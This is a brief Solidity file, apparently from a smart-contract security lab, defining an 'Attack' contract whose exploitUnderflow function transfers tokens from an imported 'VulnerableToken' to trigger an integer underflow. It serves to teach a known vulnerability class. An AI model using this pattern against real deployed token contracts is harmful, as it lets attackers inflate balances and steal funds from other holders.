// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

import "./VulnerableToken.sol";

contract Attack {
    VulnerableToken public token;

    constructor(address _vulnerableTokenAddress) {
        token = VulnerableToken(_vulnerableTokenAddress);
    }

    // Perform underflow attack
    function exploitUnderflow() public {
        token.transfer(msg.sender, 10); // ⚡ Try sending 10 token
    }
}
